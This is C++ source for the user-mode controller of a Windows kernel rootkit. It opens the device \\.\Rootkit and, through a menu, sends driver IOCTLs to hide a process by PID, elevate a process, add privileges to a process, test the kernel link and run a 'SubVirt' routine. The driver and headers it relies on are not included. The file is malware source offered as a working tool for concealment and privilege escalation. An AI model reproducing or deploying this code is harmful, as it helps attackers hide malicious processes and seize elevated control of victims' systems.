#include <iostream>
#include <Windows.h>
#include <string.h>
#include "IOCTLs.h"
#include "utils_client.h"
#include <vector>

using namespace std;

int main() {
	HANDLE hDevice;
	DWORD bytesReturned;;
	BOOL success;
	int option;
	char inbuffer[100] = { 0 };
	char outbuffer[100] = { 0 };
	string privs;
	char buf[100] = { 0 };
	char str = 'y';
	vector<string> PrivsToAdd;
	PVARS Priv;
	ULONG num;

	hDevice = CreateFileW(L"\\\\.\\Rootkit",GENERIC_READ| GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);

	cout << "hDevice handle : " << hDevice << endl;

	 if (hDevice == INVALID_HANDLE_VALUE) {
		 cout << "Failed to open device "<< GetLastError() << endl;
		 return 1;
	 }


	 while (str == 'y') {
		 printf("Menu:\n");
		 cout << "1. Hide Process" << endl;
		 cout << "2. Elevate Process" << endl;
		 cout << "3. Add Privileges" << endl;
		 cout << "4. Test Connection" << endl;
		 cout << "5. SubVirt" << endl;
		 cout << "6. Exit" << endl;

		 cout << "Enter option: ";
		 cin >> option;

		 switch (option)
		 {
		 case 1:
			 cout << "Enter the pid to hide : "; cin >> buf;
			 strcpy_s(inbuffer, buf);

			 success = DeviceIoControl(hDevice, Hide, inbuffer, sizeof(inbuffer), outbuffer, sizeof(outbuffer), &bytesReturned, NULL);
			 if (success) {
				 cout << "Process Hidden" << endl;
			 }
			 else {
				 cout << "Failed to hide process" << endl;
			 }
			 break;

		 case 2:
			 cout << "Enter the pid to elevate : "; cin >> buf;
			 strcpy_s(inbuffer, buf);

			 success = DeviceIoControl(hDevice, ElevateProcess, inbuffer, sizeof(inbuffer), outbuffer, sizeof(outbuffer), &bytesReturned, NULL);
			 if (success) {
				 cout << "Process Elevated" << endl;
			 }
			 else {
				 cout << "Failed to elevate process" << endl;
			 }
			 break;

		 case 3:
			 cout << "Enter the pid to add privileges : "; cin >> buf;
			 cout << "Enter the privileges to add seperated by a ',' : "; cin >> privs;

			 num = (ULONG)std::atoi(buf);

			 PrivsToAdd = Utilities::SplitString(privs, ',');

			 for (std::string& value : PrivsToAdd) {

				 Priv = Utilities::CreatePrivStruct(num, value);

				 success = DeviceIoControl(hDevice, AddPrivs, Priv, sizeof(Priv), outbuffer, sizeof(outbuffer), &bytesReturned, NULL);
				 if (success) {
					 cout << "Privilege : " << value << "Added!" << endl;
				 }
				 else {
					 cout << "Failed to add privilege : "<< value << endl;
				 }
			 }
			 break;

		 case 4:
			 cout << "Enter message to send to kernel : "; cin >> buf;
			 strcpy_s(inbuffer, buf);

			 success = DeviceIoControl(hDevice, TestConnection, inbuffer, sizeof(inbuffer), outbuffer, sizeof(outbuffer), &bytesReturned, NULL);
			 if (success) {
				 cout << "Message from Kernel: " << outbuffer << endl;
				 cout << "Connection Successful" << endl;
			 }
			 else {
				 cout << "Failed to connect" << endl;
			 }
			 break;

		 case 5:
			 success = DeviceIoControl(hDevice, SubVirt, inbuffer, sizeof(inbuffer), outbuffer, sizeof(outbuffer), &bytesReturned, NULL);
			 if (success) {
				 cout << "SubVirt Successful" << endl;
			 }

			 else {
				 cout << "Failed to SubVirt" << endl;
			 }
			 break;

		 case 6:
			 str = 'n';
			 break;

		 default:
			 break;
		 }
	 }
	 return 0;
}
